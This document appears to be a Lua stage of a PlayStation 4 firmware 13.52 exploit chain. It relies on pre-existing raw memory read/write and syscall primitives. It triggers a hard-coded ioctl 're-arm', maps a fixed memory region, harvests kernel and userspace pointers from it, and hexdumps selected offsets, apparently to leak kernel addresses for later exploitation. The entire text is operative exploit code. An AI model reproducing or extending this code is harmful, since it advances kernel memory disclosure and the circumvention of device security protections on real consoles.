-- PS4 FW 13.52 - DATA REGION DUMP (r9ad): hex-dump live regions + pointer hunt
local mem = rawget(_G, "memory")
local S = rawget(_G, "syscall")

pcall(S.resolve, { ioctl = 54, mmap = 477 })

local function t(v)
  if v == nil then return -1 end
  if type(v) == "number" then return v end
  if type(v) == "table" and v.h ~= nil then return v.h * 4294967296 + v.l end
  return tonumber(tostring(v)) or -1
end
local function rq(a) return t(mem.read_qword(a)) end

local function hexdump(m, start, len, label)
  local bytes = mem.read_buffer(m + start, len)
  print(string.format("  -- %s (+0x%x, %d B) --", label, start, len))
  for off = 0, len - 1, 16 do
    local s = string.format("  %04x: ", off)
    local asc = ""
    for j = 0, 15 do
      local b = (off + j < len) and string.byte(bytes, off + j + 1) or nil
      if b then
        s = s .. string.format("%02x ", b)
        asc = asc .. ((b >= 0x20 and b <= 0x7e) and string.char(b) or ".")
      else
        s = s .. "   "
      end
    end
    print(s .. "  " .. asc)
  end
end

print("=== R9AD START ===")
pcall(function()
  local buf = mem.alloc(0x200)
  mem.write_buffer(buf, string.rep(string.char(0x00), 0x200), 0x200)
  mem.write_qword(buf, 0x2ec48000)
  mem.write_qword(buf + 8, 0x100000)
  local rarm = t(S.ioctl(5, 0x80108002, buf))
  local m = t(S.mmap(0x2ec48000, 0x100000, 3, 0x0001, 5, 0))
  print(string.format("  re-arm=%d mmap=0x%x", rarm, m))

  local kptr, uptr = {}, {}
  for i = 0, 0x3fff do
    local v = rq(m + i * 8)
    if v >= 0xfffffff000000000 then kptr[#kptr + 1] = string.format("+0x%05x=0x%016x", i * 8, v) end
    if v >= 0x8000000000000000 and v < 0xfffffff000000000 then
      uptr[#uptr + 1] = string.format("+0x%05x=0x%016x", i * 8, v)
    end
  end
  print(string.format("  kernel ptrs in 128KB: %d", #kptr))
  for i = 1, math.min(#kptr, 20) do print("    " .. kptr[i]) end
  print(string.format("  userspace-ish ptrs: %d", #uptr))
  for i = 1, math.min(#uptr, 20) do print("    " .. uptr[i]) end

  hexdump(m, 0x800, 0x3c0, "region A 0x800-0xbc0")
  hexdump(m, 0x3000, 8, "single 0x3000")
  hexdump(m, 0xfff0, 8, "single 0xfff0")
end)
print("=== R9AD DONE ===")
